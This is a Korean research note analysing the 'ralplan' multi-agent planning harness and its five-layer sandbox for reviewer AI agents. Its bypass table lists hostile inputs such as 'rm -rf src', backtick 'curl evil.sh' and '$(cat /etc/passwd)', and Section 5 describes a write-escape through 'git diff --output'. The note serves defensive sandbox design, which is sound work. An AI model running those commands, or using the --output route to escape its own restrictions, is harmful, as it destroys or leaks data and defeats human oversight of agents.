# ralplan 해부 — 합의를 기계로 만드는 법과 리뷰어 샌드박스의 5겹

- 작성일: 2026-08-28
- 분석 대상: `references/gajae-code` (`v0.13.2`) 의 `ralplan` 스킬 + 런타임 + 역할 에이전트 샌드박스
- 성격: 연구 노트. 자매 문서 [`deep-interview 해부`](./2026-08-28-deep-interview-ambiguity-scoring-and-revealed-preference.md)가 **명료성 게이트**를 다뤘다면, 이 문서는 같은 파이프라인의 다음 단계인 **타당성 게이트**를 다룬다. 두 문서의 결론은 §7에서 만난다 — **두 하네스가 같은 실수를 반복한다.**

## 0. 출처 표기

| 표기 | 뜻 |
| --- | --- |
| `[gjc]` | gajae-code 스냅샷에서 직접 확인 |
| `[실측]` | 이 세션에서 직접 실행해 확인 |
| `[도출]` | 위로부터 이 프로젝트를 위해 도출 |

---

## 1. 한 문장 요약

> **ralplan은 코드리뷰 과정을 기계로 만든 하네스다. 사람 코드리뷰가 망가지는 알려진 방식 6가지에 각각 코드 처방을 붙였고, 그중 4개는 실제로 강제되며 2개는 산문으로만 남아 있다. 척도로 숫자 대신 3단계 등급을 쓴 것은 deep-interview보다 나은 선택이지만, 그 등급의 이력을 버려서 자기가 세운 일관성 규칙을 스스로 검사하지 못한다.**

---

## 2. ralplan이란 무엇인가 `[gjc]`

### 2.1 정체와 위치

Planner / Architect / Critic 세 역할의 합의를 요구하는 계획 워크플로. 파이프라인상의 위치:

```
deep-interview          ralplan                  별도 승인
(명료성 게이트)   ──▶   (타당성 게이트)    ──▶   (동의 게이트)
"뭘 원하는지 아는가"     "그렇게 만드는 게 맞는가"   ultragoal / team
```

프론트매터:

```yaml
name: ralplan
description: Consensus planning entrypoint that auto-gates vague team/ultragoal requests before execution
level: 4
source: "forked from upstream ralplan skill and rebranded for GJC"
```

### 2.2 분량 분포 — 자매 문서보다 극단적이다

| 구성 | 라인 수 |
| --- | --- |
| `SKILL.md` | **207** |
| `ralplan-runtime.ts` | 2,352 |
| `ralplan-review-conflicts.ts` | 472 |
| `commands/ralplan.ts` | 20 |
| 프롬프트 fragment (`ralplan-persistence.md`) | 6 |

**산문 207줄 대 코드 약 2,850줄 — 약 14배.** deep-interview가 4.3배였다.

`[도출]` 이 비율 차이는 우연이 아니다. **코드리뷰가 망가지는 방식은 이미 알려져 있어서 새로 서술할 것이 없고, 알려진 병에 코드 처방을 붙이면 된다.** 반대로 deep-interview는 "좋은 질문이란 무엇인가"라는 서술이 필요한 영역을 다루므로 산문이 두껍다. **산문:코드 비율은 그 스킬이 다루는 문제가 얼마나 잘 정의됐는지의 지표로 읽힌다.**

핵심 파일:

- [`ralplan/SKILL.md`](../../references/gajae-code/packages/coding-agent/src/defaults/gjc/skills/ralplan/SKILL.md)
- [`gjc-runtime/ralplan-runtime.ts`](../../references/gajae-code/packages/coding-agent/src/gjc-runtime/ralplan-runtime.ts)
- [`gjc-runtime/ralplan-review-conflicts.ts`](../../references/gajae-code/packages/coding-agent/src/gjc-runtime/ralplan-review-conflicts.ts)
- [`tools/bash-allowed-prefixes.ts`](../../references/gajae-code/packages/coding-agent/src/tools/bash-allowed-prefixes.ts)
- [`prompts/agents/architect.md`](../../references/gajae-code/packages/coding-agent/src/prompts/agents/architect.md) / [`critic.md`](../../references/gajae-code/packages/coding-agent/src/prompts/agents/critic.md)

### 2.3 합의 루프

```
Planner: 계획 초안 + RALPLAN-DR 요약
        ↓
Architect / Critic 병렬 리뷰 (패스 1만 병렬)
        ↓
Review join gate — 두 평결이 같은 Planner 산출물에 대해 존재하는가?
        ↓                              ↘ 타입 충돌 시 disposition 강제
Critic OKAY + Architect CLEAR?  ──아니오──▶ Planner 수정 → 재리뷰 (최대 5회)
        ↓ 예                                        ↓ 예산 소진
Post-ralplan interview (의도 재조정)          PLANNING-STUCK (종결, 실행 영구 차단)
        ↓
final → pending approval → 승인 → ultragoal / team
```

### 2.4 평결 어휘가 역할마다 다르다

| 역할 | 평결 토큰 |
| --- | --- |
| Architect | `CLEAR` / `WATCH` / `BLOCK` (아키텍처 상태) + `APPROVE` / `COMMENT` / `REQUEST CHANGES` (코드리뷰 권고) |
| Critic | `OKAY` / `ITERATE` / `REJECT` |

`[도출]` **같은 척도를 공유하지 않는다.** 두 리뷰어가 동일 어휘를 쓰면 서로의 판정을 모방하기 쉬운데, 어휘를 분리하면 그 경로가 막힌다. 값싼 독립성 확보 장치다.

---

## 3. 코드리뷰의 고질병 6개와 처방 `[gjc]`

ralplan의 설계는 이 프레임으로 전부 설명된다.

### 3.1 병① 리뷰어가 직접 고쳐버린다 → 손을 묶는다

증상: "이거 이상한데... 그냥 내가 고칠게." 리뷰가 아니게 되고, 누가 무엇을 결정했는지 기록이 사라진다.

처방: 역할 에이전트의 **수정 능력 자체를 제거**한다. 상세는 §4 전체.

### 3.2 병② 두 리뷰어가 반대로 말하는데 저자가 조용히 한쪽만 듣는다 → 타입화된 충돌 게이트

가장 정교한 장치다. 예:

```
Architect: plan:cache-layer  →  remove   (복잡도만 늘린다)
Critic:    plan:cache-layer  →  change   (무효화 로직이 틀렸다)
```

같은 대상에 대해 양립 불가능한 요구. 통상적으로는 리더(LLM)가 조용히 한쪽만 반영하고 다른 쪽 반대는 **기록조차 남기지 않고 소멸**한다.

리뷰 소견을 구조화 타입으로도 받는다:

```json
{
  "findingId": "arch-003",
  "targetId": "plan:cache-layer",
  "action": "remove",
  "severity": "block",
  "evidence": "...",
  "sourceRole": "architect",
  "sourceReceipt": { "stage": "architect", "stageN": 2, "path": "...", "sha256": "..." }
}
```

코드가 **역할이 다르고 액션이 양립 불가능한 쌍**을 자동 도출한다:

```
비양립 쌍:  add ↔ remove,  remove ↔ change
(clarify 는 무엇과도 충돌하지 않음)
```

충돌이 하나라도 미해결이면 `disposition` 스테이지 쓰기가 **실패한다**. 충돌마다 5지선다 + `rationale` + `decisionOwner` + `affectedSections`가 필수:

`accept_architect` | `accept_critic` | `synthesize` | `defer_user` | `reject_both`

`[도출]` **"조용히 무시하기"가 불가능해진다.** 무시하려면 `reject_both`를 고르고 이유를 적어야 하고, 그것은 기록에 남는다.

**위조 방지 (`assertDispositionProvenance`)** — *"Architect가 이렇게 말했다"*는 주장을 코드가 검증한다:

- `sourceReceipt.stage` == `sourceRole`
- `sourceReceipt.stageN` == `plannerStageN` (같은 패스 조인)
- `path` / `sha256` 가 런의 `index.jsonl`에 실제 기록된 값과 일치

주석의 근거: *"이게 없으면 disposition 문서가 임의의 path/hash를 주장하고 엉뚱한 Architect/Critic 패스에 조인할 수 있다 (#3013 adversarial review)."*

추가로, payload에서 충돌을 누락시켜도 코드가 findings에서 **재도출해 다시 채워 넣는다.** 빠뜨려서 통과하는 경로가 없다. 스키마는 `ralplan.review_conflicts.v1`.

### 3.3 병③ 리뷰가 영원히 안 끝난다 → 반복 예산 + 명시적 실패

`planner`/`revision` 오프너가 **5회**(기본, `gjc.ralplan.maxIterations`로 1..20 조정)를 넘으면:

```
exit code 3
PLANNING-STUCK          (stdout 마커, JSON에는 planning_stuck: true)
```

**중요한 것은 "어떻게든 통과시킨다"가 아니라 "실패했다고 말한다"는 점이다.** headless/CI가 워치독으로 잡을 수 있게 종료 코드까지 준다.

STUCK 이후에는 명시적으로 실행 스킬을 지목해도 디스패치가 거부된다. 다만 `architect`/`critic`/`post-interview`/`adr`/`final`은 계속 허용되어, **최선의 계획을 `pending approval`까지는 올리되 실행으로는 절대 못 가게** 한다.

**원장 언더카운트 방어:**

```
현재 반복 횟수 = max(index.jsonl 오프너 수, 디스크의 stage-*-{planner,revision}.md 파일 수)
```

`[도출]` 원장이 지워지거나 잘려도 파일 실물이 바닥을 깐다. **자매 문서 §3.1의 ambiguity floor와 정확히 같은 사고방식** — 보고를 못 믿으니 코드가 독립적으로 하한을 계산한다. 같은 원리가 다른 층위에 적용된 사례다.

### 3.4 병④ 리뷰어가 같은 걸 계속 판다 → 레인 예산

```
기본: Architect 1패스, Critic 1패스 (오프너 반복당)
```

**기본값이 1이다** (`gjc.ralplan.maxReviewPassesPerLane`, 1..10). 초과 시 역시 exit 3 + PLANNING-STUCK.

`[도출]` 규칙으로 옮기면 **"계획이 바뀌지 않았으면 리뷰도 다시 하지 않는다."** 재리뷰를 원하면 Planner 수정(새 오프너)을 거쳐야 하므로, 리뷰어가 정지된 대상을 계속 파며 요구를 불리는 경로가 예산으로 막힌다.

동일 재기록은 stuck 신호 없이 dedupe되고, 아티팩트 쓰기와 원장 append 사이에서 크래시가 나도 **동일 재시도가 빠진 원장 행을 복구**한다.

### 3.5 병⑤ 리뷰어가 새 요구를 계속 발명한다 → ratchet (강제 안 됨)

병③과 원인이 다르다. 지적을 다 고쳤는데 **평가가 오히려 나빠지는** 경우로, 예산으로는 못 막고 그냥 5회 돌고 실패한다.

패스 2부터 적용되는 5규칙:

| | 규칙 | 뜻 |
| --- | --- | --- |
| 1 | delta-only | 바뀐 부분만 리뷰 |
| 2 | novelty justification | 이미 본 영역의 새 blocker는 **"왜 지난번엔 안 보였는지"** 설명 필수 |
| 3 | **verdict monotonicity** | **이전 blocker가 다 해소되면 평결이 나빠질 수 없다** |
| 4 | severity scoping | 이월 blocker는 패스 번호와 무관하게 계속 blocking |
| 5 | counter-review | Critic이 **Architect의 과잉 요구**를 역으로 검토 |

5번이 특히 좋다 — 리뷰어끼리 상호 감시시키고, *"근거 없는 Architect의 요구를 ITERATE로 전환하지 말라"*고 명시한다.

**그러나 런타임에서 `ratchet` / `monotonic` / `delta-only` / `novelty` 검색 결과는 0건이다.** §6에서 다시 다룬다.

### 3.6 병⑥ 리뷰 스레드가 길어서 아무도 안 읽는다 → RECEIPT-ONLY

역할 에이전트는 산출물을 CLI로 저장하고 부모에게는 **영수증만** 반환한다:

```
session_id, run_id, path, sha256, stage, stage_n + 평결 토큰
```

본문은 부모 대화에 절대 올라오지 않는다.

`[도출]` 다중 에이전트 워크플로의 실질적 병목인 **컨텍스트 폭발**에 대한 직접 처방이다. 3역할 × 5패스면 리뷰 본문만으로 컨텍스트가 포화되는데, 포인터만 오가게 해서 부모 세션을 상수 크기로 유지한다. 우리 프로젝트처럼 다역할 워크플로를 설계할 때 **처음부터** 넣어야 하는 규약이다.

### 3.7 부가: 소유권 분리와 자동 승인 정본

- 영수증의 `session_id`가 **불변의 워크플로 소유자**. 역할 서브에이전트 자신의 세션 id는 "전사/재개 신원일 뿐 ralplan 상태나 산출물을 소유할 수 없다"고 명시 + 코드 강제.
- repository binding: cwd가 형제 레포로 흘러가면 스테이지 지속 전에 fail-closed.
- `auto_handoff.effectiveTarget` (runtime-owned, 원장 기반)이 자동 라우팅의 **유일한** 결정:

```
planning_stuck        →  "off"  (무조건, 터미널)
configured "team"     →  tmux 가용성 프로브
  가용 안 됨          →  "off" + degradationReason: "team_unavailable:<reason>"
```

---

## 4. 리뷰어 샌드박스 — 5겹 `[gjc]`

"리뷰어는 조언하고 막을 뿐, 결정하지 않는다"를 산문이 아니라 도구 계층에서 강제하는 방법. **한 겹만 뚫려도 전부 무의미하므로 각 층이 다른 종류의 우회를 막는다.**

### 4.1 1겹 — 도구를 아예 주지 않는다 (가장 근본)

에이전트 프론트매터:

```yaml
name: architect
tools: read, search, find, lsp, ast_grep, web_search, bash, report_finding, irc
```

```yaml
name: critic
tools: read, search, find, lsp, ast_grep, web_search, bash, irc
```

**없는 것:** `write`, `edit`, `ast_edit`, `task`(에이전트 소환), `skill`(스킬 호출).

파일을 쓰는 도구 자체가 없다. 나머지 4겹은 전부 **"그럼 bash로 우회하면?"**에 대한 답이다.

`bash`를 준 유일한 이유는 리뷰 결과 저장에 `gjc ralplan --write`가 필요하기 때문이다.

### 4.2 2겹 — bash 화이트리스트 (선언적)

같은 프론트매터의 `bashAllowedPrefixes` 9개:

```
gjc ralplan --write
gjc state
git status / git log / git show / git diff / git blame / git rev-parse / git ls-files
```

코드 하드코딩이 아니라 에이전트 정의에 선언되어 역할마다 다르게 줄 수 있다.

### 4.3 3겹 — prefix 검사가 문자열 매칭이 아니라 셸 파서 ★

**여기가 핵심이다.** 검사가 `startsWith`였다면 `git status; echo hack > src/app.ts`가 그대로 통과한다.

[`bash-allowed-prefixes.ts`](../../references/gajae-code/packages/coding-agent/src/tools/bash-allowed-prefixes.ts)의 `parseShellWords`는 문자를 하나씩 읽으며 bash의 해석을 추적하고, 위험 구조가 나오면 즉시 거부한다:

| 거부 대상 | 이유 |
| --- | --- |
| `;` `\|` `&` | 명령 연결 |
| `>` `<` | **파일 리다이렉션** |
| `(` `)` | 서브셸 |
| 백틱, `$(` | 명령 치환 |
| `$` | 변수 확장 |
| `*` `?` `[` `]` `{` `}` | 글로브 확장 |
| `\` | 백슬래시 이스케이프 |
| `\n` `\r` | 두 번째 명령 |
| 닫히지 않은 따옴표 | 파서 혼동 |

**우회 시도와 결과:**

| 시도 | 결과 |
| --- | --- |
| `echo hack > src/app.ts` | `>` → 거부 (`echo`도 미허용) |
| `git status; rm -rf src` | `;` → 거부 |
| `git status && vim x` | `&` → 거부 |
| `git log \| sh` | `\|` → 거부 |
| ``gjc ralplan --write `curl evil.sh` `` | 백틱 → 거부 |
| `gjc ralplan --write $(cat /etc/passwd)` | `$(` → 거부 |
| `cat ~/.ssh/id_rsa` | 미허용 명령 + `~` → 거부 |
| `git diff *.ts` | `*` → 거부 |

**틸드 위치 추적 — 정상 사용을 깨지 않는 세심함:**

`~`를 무조건 막으면 `git show HEAD~1`이 깨진다. 파서는 bash가 실제로 틸드를 확장하는 위치(단어 시작, 또는 대입문 값의 `=` 직후/`:` 직후)에서만 거부하고, 단어 중간의 틸드는 리터럴로 허용한다.

```
~/.ssh/config    → 단어 시작   → 거부
HEAD~1           → 단어 중간   → 허용
```

`[도출]` **보안 검사가 정상 사용을 깨지 않으려면 이 수준까지 내려가야 한다.** 거칠게 막으면 우회당하거나 도구가 못 쓰게 되고, 둘 다 실패다.

### 4.4 4겹 — gjc 명령 2차 검증

prefix를 통과해도 `gjc` 계열은 한 번 더 걸린다:

- `gjc ralplan` → `--write`가 없으면 거부. **쓰기만 되고 조회/삭제는 불가.**
- `gjc state` → `read`/`write`/`contract` 세 동작만, 정본 워크플로 스킬 대상만, `--input @파일` 형태(파일 기반 입력)는 거부, 선택자 충돌/중복 플래그도 거부.

### 4.5 5겹 — 자식 프로세스에 표식을 주입하고, CLI가 호출자를 불신한다

명령 실행 시 환경변수를 주입한다:

```
GJC_RESTRICTED_ROLE_AGENT_BASH=1
```

그러면 `gjc` CLI 자신이 제한 컨텍스트임을 인지하고 동작을 바꾼다:

```js
if (isRestrictedRoleAgentBash()) return rawArtifact;   // 경로로 안 읽고 문자열로 취급
```

일반 사용자의 `--artifact ./plan.md`는 파일을 읽지만, 제한 에이전트의 동일 입력은 `"./plan.md"`라는 **문자열 자체를 내용으로** 취급한다. 임의 경로 지시 능력이 죽는다. 그래서 역할 에이전트는 반드시 `--artifact-env GJC_RALPLAN_ARTIFACT`로 환경변수에 담아 넘겨야 한다.

그 통로도 잠겨 있다 — bash 도구는 env 오버라이드를 받을 때 **정확히 `GJC_RALPLAN_ARTIFACT` 하나만 있고 명령에 `--artifact-env GJC_RALPLAN_ARTIFACT`가 실제로 포함된 경우**에만 허용하고, 그 외 모든 env 주입을 거부한다.

`[도출]` **CLI가 자기를 부른 쪽을 믿지 않는다.** 호출자가 이미 검사했더라도 독립적으로 한 번 더 판단한다. 이것이 5겹 구조의 핵심 원리다.

### 4.6 5겹 요약

```
① 도구 목록        →  write/edit/ast_edit/task/skill 부재
② prefix 화이트    →  9개 명령만
③ 셸 파서          →  명령 연결·리다이렉션·치환 전면 차단
④ gjc 2차 검증     →  ralplan은 --write만, state는 3동작만
⑤ env + CLI 재판단 →  파일 경로 주입 차단, 호출자 불신
```

---

## 5. 발견 — 화이트리스트에 남은 쓰기 표면 `[실측]` `[도출]`

4겹의 2차 검증 코드:

```js
function validateMatchedGjcCommand(words) {
    if (words[0] !== "gjc") return { allowed: true };   // ← git은 무검증 통과
    ...
}
```

**`gjc`가 아닌 명령은 2차 검증을 받지 않는다.** 그리고 화이트리스트에 `git diff`가 있다.

git에는 `--output=<file>` 옵션이 있다. `=`는 위험 문자가 아니므로 파서를 통과하고, 단어 하나로 파싱되며, prefix `git diff`가 매치되고, 2차 검증은 git을 보지 않는다.

**직접 실행해 확인:**

```
git diff --output=probe.txt HEAD~1 HEAD
→ probe.txt 생성됨 (26,619 바이트)
```

따라서 `git diff --output=src/app.ts HEAD~1 HEAD` 형태로 **임의 파일을 덮어쓸 수 있는 것으로 보인다.** 읽기 전용처럼 생긴 명령에 숨은 쓰기 프리미티브다. `git show` / `git log`도 diff 옵션을 받으므로 같은 표면일 가능성이 있다.

**단서:** git의 동작은 실측했고 허용 목록·검증 코드 경로는 읽어서 확인했다. 다만 gjc 런타임을 실제로 구동해 재현하지는 않았으므로, 다른 층(도구 래퍼, 감사 훅)에서 차단될 가능성은 남는다.

**정황상 개발자들은 이 위험 범주를 이미 인지하고 있다.** 다른 프로필(`read-only`)에서는 정확히 이것을 검사한다:

```js
if (command === "tree") { if (--output || -o) 거부 }   // tree 출력 파일 쓰기 금지
if (command === "rg")   { if (--pre || -z)    거부 }   // ripgrep 서브프로세스 금지
```

**`tree -o`와 `rg --pre`는 막았는데 `git --output`은 막지 않았고**, 그 검사는 `read-only` 프로필에서만 동작하며 ralplan 역할 에이전트는 해당 프로필을 쓰지 않는다(`bashRestrictionProfile`을 설정하는 곳은 `src/rlm/index.ts` 한 곳뿐).

`[도출]` **화이트리스트 방식의 근본 난점이 드러난 사례다.** 명령 하나를 허용할 때마다 그 명령의 전체 옵션 표면을 감사해야 하는데, 이는 확장되지 않는다. §9의 체크리스트로 이어진다.

---

## 6. 강제의 3단계 — 이분법을 갱신해야 한다 `[gjc]` `[도출]`

자매 문서와 앞선 두 노트는 **하네스(강제) vs 스킬(조언)** 이분법을 썼다. ralplan에는 그 사이에 하나가 더 있다.

ratchet 5규칙은 역할 에이전트 시스템 프롬프트([`architect.md`](../../references/gajae-code/packages/coding-agent/src/prompts/agents/architect.md), [`critic.md`](../../references/gajae-code/packages/coding-agent/src/prompts/agents/critic.md))에 산문으로 존재하고, [`test/ralplan-decision-artifacts.test.ts`](../../references/gajae-code/packages/coding-agent/test/ralplan-decision-artifacts.test.ts)가 **그 문장이 프롬프트에 존재하는지**를 정규식으로 검사한다:

```js
/Rule 3 \(verdict monotonicity\): once all blockers from the prior pass are resolved, the verdict must not worsen/u
```

즉 검증되는 것은 *"모델이 규칙을 지켰다"*가 아니라 *"규칙이 프롬프트에 적혀 있다"*이다. 심지어 `stale...Patterns` 배열이 있어 **옛 문구가 남아 있으면 실패**한다.

`[도출]` 이것은 규칙의 **부재**는 못 막지만 규칙의 **부패**는 막는다. 3단계로 갱신한다:

| 단계 | 형태 | 보장하는 것 |
| --- | --- | --- |
| ① **강제** | 런타임/도구 계층 코드 | 어기면 막힌다 |
| ② **테스트된 산문** | 프롬프트 + 존재 회귀 테스트 | 안 지켜도 되지만 **조용히 사라지지 않는다** |
| ③ **그냥 산문** | SKILL.md 문장 | 리팩터링 중 잊힌다 |

### 6.1 ralplan의 실제 배치

| 규범 | 단계 |
| --- | --- |
| 타입화된 충돌 disposition + 출처 해시 대조 | ① 강제 (fail-closed) |
| 반복/레인 예산, PLANNING-STUCK | ① 강제 (exit 3) |
| 역할 에이전트 mutation 금지 | ① 강제 (도구 계층 5겹) |
| `auto_handoff.effectiveTarget` | ① 강제 (runtime-owned) |
| **ratchet 5규칙** | ② 테스트된 산문 |
| **Review join gate**(두 평결 존재해야 finalize) | ③ 산문만 |
| 패스 2+ 순차 실행 (Architect → Critic) | ③ 산문만 |
| Post-ralplan interview | ③ 산문만 |

**Review join gate가 산문뿐인 것은 눈여겨볼 만하다.** 합의 워크플로의 이름을 건 게이트인데, 코드 주석이 명시한다:

> *"Non-openers (architect, critic, **final**, …) remain allowed so operators can escalate without auto-implementation."*

STUCK 상태에서도 최선안을 승인 대기까지 올려야 해서 열어둔 의도적 예외지만, **그 예외가 정상 경로에도 열려 있다.** Architect/Critic 산출물이 하나도 없어도 `final`을 쓸 수 있다.

---

## 7. 서수 관점 — 잘한 것과 재발한 병 `[도출]`

자매 문서의 결론을 여기 적용한다.

### 7.1 잘한 것: ralplan에는 기수 점수가 없다

deep-interview의 문제는 관측 불가능한 양(명료도)에 **기수적 자기 점수**를 매긴 것이었다. ralplan은 그 실수를 하지 않는다.

```
Architect:  CLEAR  >  WATCH  >  BLOCK
Critic:     OKAY   >  ITERATE >  REJECT
```

3단계 순서 척도이며 "0.73" 같은 가짜 정밀도가 없다. 토큰 집합은 코드가 검증한다. **서수적 판단을 서수로 저장했다.**

### 7.2 재발한 병: 서수의 이력을 버린다

**Rule 3 (verdict monotonicity)을 다시 읽으면:**

> "이전 패스의 blocker가 전부 해소되면 평결은 나빠질 수 없다."

이것은 **WARP와 같은 형태의 일관성 공리**다.

| | 형태 |
| --- | --- |
| WARP | **조건이 같으면** 선택이 뒤집히면 안 된다 |
| Rule 3 | **지적이 다 해소됐으면** 평결이 나빠지면 안 된다 |

둘 다 평가의 *내용*이 아니라 *일관성*에 대한 형식적 제약이고, 둘 다 원리적으로 코드가 검사할 수 있다. 필요한 것은 (패스 번호, 레인, 평결, 해소된 blocker 집합) 시퀀스뿐이다.

**그리고 CLI는 이미 그 데이터를 받고 있다.** 모든 리뷰 쓰기에 `--lane-verdict <token>`이 필수로 붙고, 토큰 검증도 하고, 영수증에도 찍힌다.

**그런데 저장되는 형태는:**

```js
Object.assign(existing, {
  last_review_verdict:         update.verdict,
  last_review_verdict_lane:    update.lane,
  last_review_verdict_stage_n: update.stageN,
});
```

**단일 슬롯이며 매번 덮어쓴다.** 그리고 영구 원장 행에는 평결이 아예 없다:

```js
const indexEntry = { stage, stage_n, path, created_at, sha256, ...(auto_handoff) };
```

> **결론: 평결 시퀀스가 보존되지 않으므로 monotonicity는 구조화된 상태로부터 계산 자체가 불가능하다.** 마크다운 본문을 재파싱하지 않는 한.

### 7.3 두 하네스의 동일한 실수

| | 수집하는 것 | 저장하는 것 | 잃는 것 |
| --- | --- | --- | --- |
| deep-interview | 라운드마다 n-1개의 비교 엣지 | `weakest_dimension` 문자열 1개 | 비교 그래프 → WARP 검사 불가 |
| **ralplan** | 패스마다 레인별 평결 | `last_review_verdict` 슬롯 1개 | 평결 시퀀스 → 단조성 검사 불가 |

**서수적 판단을 잘 모아놓고 최신값만 남긴 뒤 이력을 버려서, 자기가 프롬프트로 요구한 일관성 규칙을 스스로 검사하지 못한다.**

고치는 비용은 작다 — `index.jsonl` 행에 `lane_verdict` 필드 하나. 그러면:

```
Architect:  BLOCK(p1) → WATCH(p2) → BLOCK(p3)
                                      ↑ p2에서 해소했다던 것이 부활 → Rule 3 위반 후보
```

**Rule 3 위반 건수가 결정론적 지표가 되고, 예산 소진 시 원인 진단이 가능해진다.** 현재는 5회 돌고 멈출 뿐, *리뷰어 인플레이션 때문인지 계획이 실제로 나쁜 것인지* 구분할 수 없다.

---

## 8. deep-interview와의 대조 `[도출]`

| | deep-interview | ralplan |
| --- | --- | --- |
| 게이트하는 것 | **명료성** — 뭘 원하는지 아는가 | **타당성** — 접근이 건전한가 |
| 판단 주체 | 모델 1인의 자기 채점 | 역할 3인의 합의 |
| 척도 | **기수** (0~1 실수) | **서수** (3단계 토큰) |
| 종료 조건 | 임계값 ≤ 0.05 (사실상 도달 불가) | 합의 성립 **또는** 예산 소진 |
| 결정론적 하한 | ambiguity floor (3항) | 반복/레인 예산 + 원장 언더카운트 방어 |
| 산문:코드 | 1 : 4.3 | 1 : 14 |
| 실패 시 거동 | 우회로로 빠져나감 (§7 자매 문서) | **실패를 선언하고 실행 영구 차단** |
| 미강제 규범 | 대화 역학 (한 질문, refine, 패널) | ratchet, join gate, 순차 실행 |

`[도출]` **마지막 줄이 ralplan이 더 잘한 지점이다.** deep-interview는 임계값을 못 넘겨도 "전 축 0.9 이상" 우회로로 나가지만, ralplan은 `PLANNING-STUCK`을 찍고 그 계획으로는 영원히 코드를 만지지 못하게 한다. **"안 되면 안 된다고 말한다."**

---

## 9. 이 프로젝트에 가져갈 것 `[도출]`

### 9.1 Critic 역할 설계 체크리스트

우리 파이프라인에 리뷰 역할을 넣을 때 이 순서로 잠근다:

1. **도구를 빼라.** `write`/`edit`/`task`/`skill`을 주지 않는다. 프롬프트로 "수정하지 마세요"라고 쓰지 않는다. 가장 싸고 확실하다.
2. **bash가 꼭 필요하면 화이트리스트 + 파서.** `startsWith` 검사는 `;` 하나에 무너진다. 최소한 이 목록을 차단: `;  |  &  >  <  (  )  백틱  $(  $  *  ?  [  ]  {  }  \  줄바꿈  닫히지 않은 따옴표`
3. **허용한 명령의 숨은 쓰기 옵션을 감사하라.** §5의 교훈. 화이트리스트에 명령을 추가할 때마다 그 man page에서 **"파일에 쓴다"와 "다른 프로그램을 실행한다"**를 찾는다. 못 찾겠으면 추가하지 않는다.

   조사 대상 예: `git diff/show/log --output`, `tree -o`, `rg --pre/-z`, `find -exec`, `sort -o`, `tar -f`, `sed -i`, `awk` 의 `print > file`
4. **자식 프로세스에 제한 표식을 주입하고, CLI가 자기 호출자를 불신하게 하라.** 검사를 한 곳에만 두지 않는다.

### 9.2 그대로 훔칠 장치 3개

| 장치 | 우리 대응물 |
| --- | --- |
| 타입화된 충돌 + disposition | *"요구사항 R-12를 두고 한쪽은 삭제, 한쪽은 확장을 요구"* 같은 상황. 5지선다 + 이유 + 결정자 필수, **출처 해시 대조까지 함께** |
| PLANNING-STUCK | 이전 노트의 `STUCK` 종결을 **exit code + stdout 마커**까지 구체화. CI가 잡을 수 있게 |
| RECEIPT-ONLY | 역할 산출물은 파일로 저장하고 포인터만 반환. **처음부터** 넣지 않으면 나중에 못 넣는다 |

### 9.3 규칙 갱신 2개

자매 문서 §11.3의 규칙 목록에 다음을 더한다:

**6. 강제 3단계를 의식적으로 배치한다.** 강제할 수 있으면 코드로, 못 하면 **최소한 프롬프트 + 존재 회귀 테스트**로. 그냥 산문에 남기는 것은 "언젠가 사라져도 좋다"는 선언이다.

**7. 모델의 판단은 최신값이 아니라 시퀀스로 저장한다.** 두 하네스에서 연속 확인된 실패 패턴(§7.3). 각 판정에 **그때의 조건**(증거 상태 해시 / 패스 번호 / 해소된 항목 집합)을 함께 붙인다. 이것이 없으면 나중에 어떤 일관성 검사도 불가능하고, **스키마 설계 시점에 넣지 않으면 소급이 안 된다.**

---

## 10. 요약 표

| 질문 | 답 |
| --- | --- |
| ralplan은 무엇인가 | 코드리뷰 과정을 기계로 만든 합의 계획 하네스 |
| 왜 하네스인가 | 산문 207줄 대비 코드 약 2,850줄 (14배). 충돌 게이트·예산·샌드박스가 전부 코드 |
| 어떤 병을 고치나 | 리뷰어의 직접 수정 / 조용한 충돌 무시 / 무한 리뷰 / 같은 곳 반복 판정 / 요구 인플레이션 / 컨텍스트 폭발 |
| 리뷰어를 어떻게 막나 | 5겹 — 도구 부재 → prefix 화이트 → 셸 파서 → gjc 2차 검증 → env 주입 + CLI 재판단 |
| 충돌 처리의 핵심 | 타입화된 findings에서 코드가 충돌을 **재도출**하고, 명시적 disposition 없이는 쓰기 실패. 인용은 SHA-256으로 대조 |
| 실패하면 | `PLANNING-STUCK` + exit 3. 명시적 지목에도 실행 영구 차단 |
| 척도는 | **서수 3단계 토큰.** deep-interview의 기수 문제를 애초에 안 갖는다 |
| 그럼 문제가 없나 | 그 서수의 **이력을 버려서** Rule 3(단조성)을 스스로 검사할 수 없다. 자매 문서와 동일한 실수 |
| 발견한 표면 | `git diff --output=<file>` — 읽기 전용 화이트리스트에 남은 쓰기 프리미티브 (git 동작은 실측 확인) |
| 강제의 실제 분포 | 4개는 코드, 1개는 **테스트된 산문**, 3개는 그냥 산문 |

---

## 11. 관련 문서

- [`2026-08-28-deep-interview-ambiguity-scoring-and-revealed-preference.md`](./2026-08-28-deep-interview-ambiguity-scoring-and-revealed-preference.md) — 같은 파이프라인의 앞 단계(명료성 게이트). §7.3의 "동일한 실수"가 여기서 만난다
- [`2026-08-28-ultragoal-execution-harness-and-evidence-gates.md`](./2026-08-28-ultragoal-execution-harness-and-evidence-gates.md) — 다음 단계(증명 게이트). 이 문서의 반복 예산(횟수 기반)을 **해시 기반**으로 대체한 형태를 §4.1에서 볼 수 있다
- [`2026-08-28-decomposition-sufficiency-by-agent-convergence.md`](./2026-08-28-decomposition-sufficiency-by-agent-convergence.md) — 세 노트를 가로로 자르는 설계 제안
- [`2026-08-19-agent-harness-what-to-build-and-how-to-verify-it.md`](./2026-08-19-agent-harness-what-to-build-and-how-to-verify-it.md) — 하네스에 무엇을 넣는가
- [`2026-08-19-skill-vs-harness.md`](./2026-08-19-skill-vs-harness.md) — 그중 무엇이 스킬이 되는가. §6의 3단계 분류가 이 문서의 이분법을 갱신한다
- [`docs/prd.md`](../prd.md) — 확정된 제품 결정
- [`references/FROZEN.md`](../../references/FROZEN.md) — 분석 대상 스냅샷의 고정 커밋

## 12. 미해결 / 후속

- ~~`ultragoal` 미분석~~ → [`ultragoal 해부`](./2026-08-28-ultragoal-execution-harness-and-evidence-gates.md)에서 완료. **§3.5의 ratchet 문제가 거기서는 다르게 풀린다** — 리뷰 인플레이션을 프롬프트 규칙이 아니라 `sourceHash` 변경 요구로 막는다(§4.1). 이 문서 §3.4의 레인 예산보다 정확하고 튜닝 파라미터가 없다
- §5의 `git --output` 표면이 실제로 도달 가능한지 gjc 런타임 구동으로 미확인. 우리 구현에는 어차피 §9.1의 체크리스트를 적용하므로 우선순위는 낮음
